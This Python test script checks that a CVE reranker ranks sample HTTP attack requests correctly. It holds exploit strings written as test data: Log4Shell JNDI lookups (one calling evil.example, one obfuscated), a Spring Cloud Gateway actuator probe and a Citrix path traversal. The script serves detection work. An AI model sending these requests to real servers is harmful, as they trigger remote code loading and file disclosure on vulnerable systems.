from __future__ import annotations

import sys
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[1]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from src.core.cve_reranker import rerank_candidates


def main() -> None:
    payload = "GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1 Host: victim"
    candidates = [
        {"cve": "CVE-2021-41773", "score": 0.048, "retrieval_score": 0.048, "evidence": "path traversal"},
        {"cve": "CVE-2021-44228", "score": 0.0424, "retrieval_score": 0.0424, "evidence": "jndi"},
    ]
    ranked = rerank_candidates(payload, candidates)
    assert ranked[0]["cve"] == "CVE-2021-44228"
    assert ranked[0]["rule_confirmed"] is True
    assert "log4shell_jndi" in ranked[0]["signals"]

    obfuscated = "HEAD / HTTP/1.1 User-Agent: ${jNd${x:-i:}}ldap://example/a"
    ranked = rerank_candidates(obfuscated, [])
    assert ranked[0]["cve"] == "CVE-2021-44228"
    assert "obfuscated_jndi_lookup" in ranked[0]["signals"]

    gateway = "GET /actuator/gateway/routes/hacktest HTTP/1.1 Host: redacted"
    ranked = rerank_candidates(gateway, [])
    assert ranked[0]["cve"] == "CVE-2022-22947"

    citrix = "GET /vpn/../vpns/cfg/smb.conf HTTP/1.1 Host: redacted"
    ranked = rerank_candidates(citrix, [])
    assert ranked[0]["cve"] == "CVE-2019-19781"


if __name__ == "__main__":
    main()
